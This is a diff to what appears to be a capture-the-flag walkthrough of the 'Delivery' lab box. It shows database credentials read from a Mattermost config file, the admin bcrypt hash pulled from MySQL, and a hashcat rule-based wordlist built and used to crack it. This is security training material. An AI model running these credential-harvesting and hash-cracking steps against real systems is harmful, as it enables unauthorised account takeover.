@@ -168,18 +168,19 @@ maildeliverer@Delivery:~$
 ### 5. Enumerate from user
 Looking through what's accessable from the user, there is not a whole lot to see at first. However by taking a dive into some of the configuration files for mattermost, there is a line in the app's config.json which seems like a hint:
 ```json
-ettings": {
+Settings": {
         "DriverName": "mysql",
         "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
         "DataSourceReplicas": [],
         "DataSourceSearchReplicas": [],
+...
 ```
 From here I figure I am probably looking for some type of hash in the database.
 
 ### 6. Get the admin's hash
 The admin's hash can be retrieved from the mattermost SQL database.
 ```bash
-ldeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -p
+maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -p
 Enter password: 
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
 Your MariaDB connection id is 258
@@ -312,6 +313,22 @@ This appears to be a bcrypt hash.
 Keeping in mind the other piece of information that was given in the internal chat: "PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.", I will apply a ruleset to the password "PleaseSubscribe!"
   
 ```bash
+┌──(kali㉿kali)-[~/Desktop/htb/delivery]
+└─$ echo "PleaseSubscribe\!" | hashcat -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule --stdout > pleasesub.list
+
+┌──(kali㉿kali)-[~/Desktop/htb/delivery]
+└─$ head pleasesub.list                                                                                                            
+PleaseSubscribe!
+pleasesubscribe!
+PLEASESUBSCRIBE!
+Pleasesubscribe!
+!ebircsbuSesaelP
+PleaseSubscribe!PleaseSubscribe!
+Pleasesubscribe!Pleasesubscribe!
+PleaseSubscribe!PleaseSubscribe!PleaseSubscribe!PleaseSubscribe!
+Pleasesubscribe!Pleasesubscribe!Pleasesubscribe!Pleasesubscribe!
+PLEASESUBSCRIBE!PLEASESUBSCRIBE!PLEASESUBSCRIBE!PLEASESUBSCRIBE!
+
 ┌──(kali㉿kali)-[~/Desktop/htb/delivery]
 └─$ hashcat -a 0 -m 3200 root.hash pleasesub.list  --force                                                                         
 hashcat (v6.1.1) starting...
